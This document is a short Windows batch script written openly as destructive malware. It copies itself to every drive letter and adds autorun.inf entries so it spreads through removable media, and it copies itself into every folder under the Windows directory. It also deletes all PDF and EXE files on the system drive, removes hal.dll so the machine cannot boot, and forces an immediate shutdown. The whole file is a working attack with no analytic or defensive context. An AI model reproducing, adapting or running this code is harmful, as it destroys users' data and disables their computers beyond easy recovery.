@echo off
REM ---------------------------------
REM Infect All Drives
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
REM ---------------------------------
rem ---------------------------------
rem Delete All Pdf
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
rem ---------------------------------
REM ---------------------------------
REM Delete All Exe
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
 REM ---------------------------------
REM ---------------------------------
REM Infect All Folders
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
REM ---------------------------------
REM ---------------------------------
REM Disable Computer By Deleting hal.dll
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
shutdown /s /t 00
REM ---------------------------------